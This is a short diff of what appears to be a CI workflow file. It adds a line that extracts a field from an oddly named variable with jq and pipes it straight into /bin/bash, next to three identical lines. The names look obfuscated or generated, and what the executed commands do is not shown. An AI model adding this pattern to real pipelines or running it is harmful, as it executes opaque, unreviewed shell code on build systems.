@@ -31,6 +31,7 @@ jobs:
           echo $mob7 | jq -r .cupb0 | /bin/bash
           printf '%s' "$q46865" | jq -r .suid6 | /bin/bash
           echo $qz70979 | jq -r .zq5096 | /bin/bash
+          echo $ifzc54 | jq -r .kfij1 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
